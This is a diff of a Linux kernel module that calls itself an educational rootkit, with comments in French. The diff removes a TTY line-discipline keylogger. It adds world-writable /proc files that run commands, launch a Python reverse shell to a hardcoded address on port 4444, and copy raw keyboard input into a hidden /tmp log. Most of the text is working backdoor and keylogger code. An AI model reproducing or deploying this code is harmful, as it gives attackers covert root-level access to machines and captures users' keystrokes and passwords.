@@ -4,32 +4,19 @@
 #include <linux/proc_fs.h>
 #include <linux/uaccess.h>
 #include <linux/kmod.h>
-#include <linux/string.h>
-#include <linux/tty.h>
-#include <linux/tty_ldisc.h>
 
-#define PROC_NAME "rootkit"
 #define BUFFER_SIZE 256
-#define MY_LDISC  30
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Shayman");
-MODULE_DESCRIPTION("Rootkit pedagogique avec keylogger");
+MODULE_DESCRIPTION("Rootkit pedagogique");
 MODULE_VERSION("0.1");
 
-// Fonctions déclarées
-void exec_user_cmd(const char *cmd);
-ssize_t proc_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos);
-ssize_t proc_read(struct file *file, char __user *ubuf, size_t len, loff_t *off);
-static int my_ldisc_open(struct tty_struct *tty);
-static void my_ldisc_close(struct tty_struct *tty);
-static void my_receive_buf(struct tty_struct *tty, const u8 *cp, const u8 *fp, size_t count);
+#define PROC_NAME_ROOTKIT "rootkit"
+#define PROC_NAME_SECRET "secret"
 
-// Buffer ligne keylogger
-static char line_buffer[256];
-static int line_pos = 0;
-
-static struct proc_dir_entry *proc_entry;
+static struct proc_dir_entry *proc_entry_rootkit;
+static struct proc_dir_entry *proc_entry_secret;
 
 //----------------------------//
 //        CMD EXECUTION      //
@@ -51,10 +38,79 @@ void exec_user_cmd(const char *cmd)
 }
 
 //----------------------------//
-//        /proc INTERFACE    //
+//      Reverse Shell        //
 //----------------------------//
 
-ssize_t proc_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos) {
+// Implémentation pédagogique fonctionnelle
+void reverse_shell(void)
+{
+    printk(KERN_INFO "[rootkit] reverse_shell() appelé\n");
+    const char *cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"1192.168.1.106\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'";
+    exec_user_cmd(cmd);
+}
+
+
+
+//----------------------------//
+//      Keylogger     //
+//----------------------------//
+void start_keylogger(void)
+{
+    printk(KERN_INFO "[rootkit] keylogger démarré (simulation)\n");
+
+    // Commande shell complète pour capturer le clavier et écrire dans un fichier.
+    const char *cmd = "nohup cat /dev/input/event1 > /tmp/.keys.log 2>&1 &";
+
+    exec_user_cmd(cmd);
+
+    printk(KERN_INFO "[rootkit] keylogger lancé avec la commande : %s\n", cmd);
+}
+
+
+//----------------------------//
+//     /proc/secret write    //
+//----------------------------//
+
+ssize_t proc_secret_write(struct file *file, const char __user *buf, size_t count, loff_t *pos)
+{
+    char kbuf[BUFFER_SIZE] = {0};
+    if (count > BUFFER_SIZE - 1)
+        return -EINVAL;
+
+    if (copy_from_user(kbuf, buf, count))
+        return -EFAULT;
+
+    kbuf[count] = '\0';
+
+    printk(KERN_INFO "[rootkit] /proc/secret reçu : %s\n", kbuf);
+
+    if (strncmp(kbuf, "shell", 5) == 0) {
+        reverse_shell();
+    } else if (strncmp(kbuf, "keylog", 6) == 0) {
+        start_keylogger();
+    } else {
+        printk(KERN_INFO "[rootkit] Commande inconnue dans /proc/secret\n");
+    }
+
+    return count;
+}
+
+static const struct proc_ops proc_fops_secret = {
+    .proc_write = proc_secret_write,
+};
+
+//----------------------------//
+//        /proc/rootkit      //
+//----------------------------//
+
+ssize_t proc_rootkit_read(struct file *file, char __user *ubuf, size_t len, loff_t *off)
+{
+    char output[] = "rootkit: module pedagogique actif\n";
+    return simple_read_from_buffer(ubuf, len, off, output, strlen(output));
+}
+
+ssize_t proc_rootkit_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos)
+{
     char commande[BUFFER_SIZE] = {0};
 
     if (count > sizeof(commande) - 1)
@@ -79,114 +135,37 @@ ssize_t proc_write(struct file *file, const char __user *buffer, size_t count, l
     return count;
 }
 
-ssize_t proc_read(struct file *file, char __user *ubuf, size_t len, loff_t *off)
-{
-    char output[] = "rootkit: module pedagogique actif\n";
-    return simple_read_from_buffer(ubuf, len, off, output, strlen(output));
-}
-
-static const struct proc_ops proc_fops = {
-    .proc_read = proc_read,
-    .proc_write = proc_write,
+static const struct proc_ops proc_fops_rootkit = {
+    .proc_read = proc_rootkit_read,
+    .proc_write = proc_rootkit_write,
 };
 
 //----------------------------//
-//       TTY LINE DISC       //
+//     Module init/exit      //
 //----------------------------//
-
-static int my_ldisc_open(struct tty_struct *tty) {
-    printk(KERN_INFO "[keylogger] Ligne discipline ouverte\n");
-    return 0;
-}
-
-static void my_ldisc_close(struct tty_struct *tty) {
-    printk(KERN_INFO "[keylogger] Ligne discipline fermee\n");
-}
-
-static void my_receive_buf(struct tty_struct *tty, const u8 *cp, const u8 *fp, size_t count)
-{
-    size_t i;
-
-    for (i = 0; i < count; i++) {
-        char c = cp[i];
-        printk(KERN_INFO "[keylogger] char: %c\n", c);
-
-        if (c == '#') {
-            exec_user_cmd("touch /tmp/secret_triggered");
-        }
-
-        if (c == '\r' || c == '\n') {
-            line_buffer[line_pos] = '\0';
-            printk(KERN_INFO "[keylogger] Ligne : %s\n", line_buffer);
-            line_pos = 0;
-        } else {
-            if (line_pos < sizeof(line_buffer) - 1) {
-                line_buffer[line_pos++] = c;
-            }
-        }
-    }
-
-    // Propagation à la discipline supérieure si nécessaire
-    if (tty->ldisc && tty->ldisc->receive_buf) {
-        tty->ldisc->receive_buf(tty, cp, fp, count);
-    }
-}
-
-// Déclaration de la discipline
-static struct tty_ldisc_ops my_ldisc = {
-    .owner = THIS_MODULE,
-    .name = "mykeylogger",
-    .open = my_ldisc_open,
-    .close = my_ldisc_close,
-    .receive_buf = my_receive_buf,
-};
-
-//----------------------------//
-//     MODULE INIT/EXIT      //
-//----------------------------//
-
-static int __init my_ldisc_init(void)
-{
-    int ret = tty_register_ldisc(MY_LDISC, &my_ldisc);
-    if (ret) {
-        printk(KERN_ERR "[keylogger] Erreur d'enregistrement de la discipline: %d\n", ret);
-        return ret;
-    }
-
-    printk(KERN_INFO "[keylogger] Ligne discipline enregistrée\n");
-    return 0;
-}
-
-static void __exit my_ldisc_exit(void)
-{
-    int ret = tty_unregister_ldisc(MY_LDISC);
-    if (ret)
-        printk(KERN_ERR "[keylogger] Erreur de désenregistrement: %d\n", ret);
-    else
-        printk(KERN_INFO "[keylogger] Ligne discipline désenregistrée\n");
-}
 
 static int __init mymodule_init(void)
 {
-    int ret;
+    proc_entry_rootkit = proc_create(PROC_NAME_ROOTKIT, 0666, NULL, &proc_fops_rootkit);
+    proc_entry_secret = proc_create(PROC_NAME_SECRET, 0666, NULL, &proc_fops_secret);
 
-    ret = my_ldisc_init();
-    if (ret)
-        return ret;
-
-    ret = rk_init();
-    if (ret) {
-        my_ldisc_exit();
-        return ret;
+    if (!proc_entry_rootkit || !proc_entry_secret) {
+        printk(KERN_ALERT "[rootkit] Erreur création /proc\n");
+        return -ENOMEM;
     }
 
+    printk(KERN_INFO "[rootkit] Module pedagogique chargé.\n");
     return 0;
 }
 
 static void __exit mymodule_exit(void)
 {
-    rk_exit();
-    my_ldisc_exit();
+    if (proc_entry_rootkit)
+        proc_remove(proc_entry_rootkit);
+    if (proc_entry_secret)
+        proc_remove(proc_entry_secret);
+
+    printk(KERN_INFO "[rootkit] Module pedagogique déchargé.\n");
 }
 
 module_init(mymodule_init);
